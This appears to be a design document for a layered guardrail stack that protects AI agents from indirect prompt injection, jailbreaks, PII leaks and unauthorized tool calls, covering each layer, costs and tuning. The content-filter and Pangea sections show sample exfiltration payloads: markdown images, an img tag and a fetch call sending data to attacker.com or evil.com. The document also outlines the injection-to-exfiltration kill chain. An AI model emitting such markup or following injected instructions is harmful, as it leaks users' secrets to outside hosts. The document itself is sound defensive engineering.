# ASK — Guardrails Architecture

This document describes the defense-in-depth guardrail stack that protects agents against indirect prompt injection (XPIA), jailbreaks, PII leakage, and unauthorized tool use. The guardrails run within the LLM proxy (LiteLLM) and execute on both pre_call (scanning input before it reaches the LLM) and post_call (scanning responses before they're returned to the agent).

*Part of the ASK operating framework.*

---

## Overview and Request Flow

```
User Input
  ├─► [pre_call]  Layer 3: Content Filter   → keywords, regex, harmful categories
  ├─► [pre_call]  Layer 4: Presidio         → mask/block PII before LLM sees it
  ├─► [pre_call]  Layer 1: Cygnal           → ML scan for injection/jailbreak
  ├─► [pre_call]  Layer 2: Pangea           → injection + malicious URL scan
  ├─► [pre_call]  Layer 6: Built-in Det.    → heuristic/similarity/LLM-judge
  ▼
LLM Call (Anthropic / OpenAI / Gemini / Perplexity)
  ├─► [post_call] Layer 1: Cygnal           → ML scan for IPI/XPIA in response
  ├─► [post_call] Layer 2: Pangea           → malicious URL scan + PII on output
  ├─► [post_call] Layer 4: Presidio         → mask any PII the LLM generated
  ├─► [post_call] Layer 3: Content Filter   → blocked patterns in output
  ├─► [post_call] Layer 5: Tool Permission  → validate tool calls are authorized
  ▼
Response returned to agent / user
  ├─► [runtime]   Layer 5b: MCP Tool Policy → validate MCP tool calls at gateway (sidecar)
```

The **pre_call/post_call dual mode is non-negotiable for agents.** Pre_call catches injection in user-facing input. Post_call catches the XPIA kill chain: poisoned tool output → manipulated LLM response → exfiltration attempt or unauthorized tool call on the way back out.

---

## Layer 1: Gray Swan Cygnal — ML-based XPIA / IPI / Jailbreak Detection

**Type:** Commercial (requires Gray Swan account)

Cygnal is the only LiteLLM-integrated guardrail that explicitly differentiates **direct** injection from **indirect** prompt injection (IPI/XPIA) in tool outputs. It returns a `violation_score` between 0 and 1, along with detection flags for mutation and IPI. That distinction matters for agentic workflows — you need to know whether the injection came from the user or from poisoned external content.

**Key config parameters:**
- `violation_threshold: 0.4` — Aggressive threshold. Start here and tune up (toward 0.6–0.7) if you get too many false positives.
- `reasoning_mode: thinking` — Most thorough analysis. Use `hybrid` for faster but less accurate scans.
- `on_flagged_action: block` — Hard block on violations. Change to `log` if you want to monitor before enforcing.

## Layer 2: Pangea AI Guard — Malicious URL/Domain + Audit Trail

**Type:** Commercial (requires Pangea Cloud account; has free tier)

Catches a different class of threats than Cygnal. The critical capability is **malicious URL/domain/IP scanning**. A common XPIA exfiltration technique is getting the LLM to render something like `![](https://attacker.com/steal?data=SENSITIVE_INFO)`. Pangea detects these malicious URLs in the response before they reach the user or get rendered.

Also provides a full **audit trail with webhook support** for SIEM integration.

## Layer 3: LiteLLM Content Filter — Regex, Keywords, Harmful Categories

**Type:** Free (built into LiteLLM, no external API)

Fast first-pass pattern matching. Catches known-bad patterns: SSNs, credit card numbers, API key formats, and configurable keyword blocks. Also includes ML-based harmful content categories (self-harm, violence, bias).

**Also catches XPIA exfiltration patterns via regex:**
- Markdown image exfil: `![](https://evil.com/steal?data=SECRET)`
- HTML image exfil: `<img src="https://evil.com/...">`
- Fetch/XHR exfil: `fetch("https://evil.com/...")`

These regex patterns provide a fast, zero-cost first line of defense against the most common exfiltration techniques, even before the ML-based layers fire.

## Layer 4: Presidio PII Masking

**Type:** Free (open source from Microsoft, MIT licensed)

Detects and masks personally identifiable information — Social Security numbers, credit card numbers, emails, phone numbers, names, addresses — using Microsoft's Presidio NLP engine with spaCy. Runs locally as Flask servers, no external API calls.

**Pre_call:** Masks PII in user input before the LLM sees it.
**Post_call:** Masks any PII the LLM generated in its response.

## Layer 5: Tool Permission Guard

**Type:** Free (built into LiteLLM, YAML config only)

Enforces a whitelist of which tools the agent is allowed to call, and can restrict tool arguments to pre-approved regex patterns. This is least-privilege at the gateway level — if an XPIA attack convinces the LLM to call an unauthorized tool, the proxy blocks it.

**Default configuration is deny-all.** You must customize the tool permission rules with your actual agent tool names.

## Layer 5b: Gateway MCP Tool Policy

**Type:** Free (built into agentsh runtime gateway)

Enforces per-server, per-tool allowlists on MCP (Model Context Protocol) tool calls at the OS level. Where Layer 5 (Tool Permission Guard) mediates tool calls in LLM responses at the proxy layer, this layer mediates MCP tool calls between the agent process and MCP server subprocesses at the runtime gateway layer.

**Key capabilities:**
- **Tool allowlist** — per-MCP-server control over which tools are permitted (first-match-wins, default-deny)
- **Version pinning** — captures tool definitions on first connection, blocks the server if definitions change (rug pull detection)
- **Rate limiting** — per-server request rate and burst limits to prevent abuse
- **Skill registration control** — blocks ClawHub skills from registering new MCP servers at runtime

**Why this is separate from Layer 5:** Layer 5 (Tool Permission Guard) runs in the LLM proxy and mediates tool calls that appear in the LLM's response. Layer 5b runs in the gateway sidecar and mediates MCP tool calls that the agent makes directly to MCP server subprocesses — these never pass through the LLM proxy. A compromised agent could invoke MCP tools without going through the LLM at all, bypassing Layer 5 entirely. Layer 5b catches this.

**Policy lives in the gateway, not in OpenClaw.** OpenClaw has its own `tools.allow`/`tools.deny` config, but this runs inside the agent process and can be modified by a compromised agent. The gateway's MCP policy is in a separate filesystem namespace the agent cannot access — satisfying framework invariant 1 (constraints are external and inviolable).

## Layer 6: Built-in Prompt Injection Detector

**Type:** Free (built into LiteLLM)

Three stacked detection methods:

1. **Heuristic pattern matching** — Zero-cost, zero-latency check for known injection patterns
2. **Cosine similarity** — Compares input against a database of known attack vectors
3. **LLM-as-judge** — Uses gpt-4o-mini to classify whether the input contains injection

---

## Cost Breakdown

| Layer | Cost | Notes |
|---|---|---|
| Layer 1: Gray Swan Cygnal | Commercial | May have free tier/trial |
| Layer 2: Pangea AI Guard | Commercial (free tier) | Free tier may cover solo operator volume |
| Layer 3: Content Filter | Free | Built into LiteLLM |
| Layer 4: Presidio PII | Free | Open source, MIT licensed, runs locally |
| Layer 5: Tool Permission | Free | Built into LiteLLM |
| Layer 5b: MCP Tool Policy | Free | Built into agentsh runtime gateway |
| Layer 6: Built-in Detector | ~Free | Heuristic/similarity are free; LLM-as-judge costs fractions of a cent |

You can run Layers 3–6 (including 5b) for essentially $0 and get keyword/regex blocking, PII masking, tool permission enforcement, MCP tool mediation, and heuristic injection detection. Layers 1 and 2 add ML-based detection that catches sophisticated attacks that slip past pattern matching.

## Tuning and False Positives

**Cygnal `violation_threshold`:** Starts at 0.4 (aggressive). If you're getting false positives, increase to 0.5–0.7.

**Content Filter keywords:** The regex patterns for XPIA exfiltration may flag legitimate content that includes URLs. If the agent legitimately renders images or makes HTTP requests, you may need to allowlist specific domains.

**Tool Permission Guard:** Start with deny-all and add tools one by one as you verify they're needed.

**MCP Tool Policy:** Start with default-deny and add MCP servers/tools as needed. Enable version pinning from day one — the cost is zero and it catches supply chain attacks.

**LLM-as-judge (Layer 6):** If gpt-4o-mini classifications seem noisy, disable just the `llm_api_check` while keeping heuristic and similarity checks active.

---

*See also: [Threat Model](Threat-Model.md) for the threats these guardrails address, [Single-Agent Architecture](Single-Agent-Architecture.md) for the component topology.*